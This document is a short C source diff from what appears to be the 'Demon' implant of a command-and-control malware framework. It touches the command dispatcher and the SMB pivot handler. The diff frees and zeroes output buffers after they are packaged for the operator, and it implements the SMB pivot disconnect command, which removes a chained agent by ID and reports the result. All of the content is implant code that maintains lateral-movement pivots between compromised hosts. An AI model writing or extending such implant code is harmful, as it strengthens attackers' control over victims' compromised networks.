@@ -113,6 +113,7 @@ VOID CommandDispatcher( VOID )
             DataBuffer = NULL;
 
             ParserDestroy( &Parser );
+            ParserDestroy( &TaskParser );
         }
         else
         {
@@ -2511,6 +2512,10 @@ VOID CommandPivot( PPARSER Parser )
                 PackageAddInt32( Package, TRUE );
                 PackageAddBytes( Package, Output, BytesSize );
 
+                MemSet( Output, 0, BytesSize );
+                Instance->Win32.LocalFree( Output );
+                Output = NULL;
+
 #ifdef DEBUG
                 PPIVOT_DATA TempList = Instance->SmbPivots;
 
@@ -2538,7 +2543,15 @@ VOID CommandPivot( PPARSER Parser )
 
         case DEMON_PIVOT_SMB_DISCONNECT:
         {
+            DWORD AgentID = ParserGetInt32( Parser );
+            DWORD Success = FALSE;
 
+            Success = PivotRemove( AgentID );
+
+            PackageAddInt32( Package, Success );
+            PackageAddInt32( Package, AgentID );
+
+            break;
         }
 
         case DEMON_PIVOT_SMB_COMMAND:
